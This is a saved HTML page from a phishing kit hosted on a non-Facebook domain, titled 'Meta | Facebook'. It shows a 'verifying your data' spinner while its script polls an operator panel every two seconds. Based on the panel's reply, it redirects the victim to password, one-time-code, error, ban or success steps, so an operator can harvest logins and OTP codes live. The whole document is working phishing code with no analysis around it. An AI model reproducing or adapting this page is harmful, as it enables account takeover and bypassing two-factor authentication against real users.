<!DOCTYPE html>
<!-- saved from url=(0044)https://boxbr.xyz/appel/loading.php?com=pass -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Meta | Facebook</title>
    <link rel="shortcut icon" href="https://boxbr.xyz/appel/img/icon.ico" type="image/x-icon">
    <style>
        body, html {
            height: 100%;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: white;
            flex-direction: column;
        }
        .loader {
            width: 190px;
            height: 190px;
            background: url('./loading.gif') no-repeat center center;
            background-size: contain;
        }
        .message {
            margin-top: 20px;
            font-size: 18px;
            color: #333;
            text-align: center;
            font-family: Arial, Helvetica, sans-serif;
        }
    </style>
</head>
<body>
    <div class="loader"></div>
    <div class="message">We are verifying your data, please wait...</div>
    <script src="./jquery-3.5.1.min.js.download"></script>
    <script>
        window.onload = () => {
            setTimeout(() => {
                var z = setInterval(function () {
                    $.ajax({
                        method: "GET",
                        url: './panel/processing.php?waiting=1',
                        success: function (data) {
                            if (data.includes("ban")) {
                                window.location.href = 'loading.php?view=ban';
                            } else if (data.includes("password")) {
                                window.location.href = 'loading.php?view=password';
                            } else if (data.includes("otp")) {
                                window.location.href = 'loading.php?view=otp';
                            } else if (data.includes("passwoErr")) {
                                window.location.href = 'loading.php?view=passwoErr';
                            } else if (data.includes("otErr")) {
                                window.location.href = 'loading.php?view=otErr';
                            } else if (data.includes("success")) {
                                window.location.href = 'loading.php?view=success';
                            }
                        },
                        error: function (xhr, status, error) {
                            console.log('AJAX Error:', error);
                        }
                    });

                }, 2000);
                const urlParams = new URLSearchParams(window.location.search);
                const comm = urlParams.get('com');
                    
                if (comm === "pass") {
                    setTimeout(() => {
                        window.top.location.href = 'main.php?step=schedule';
                    }, 300000)
                }
                
            }, 3000)
        }
    </script>


</body></html>
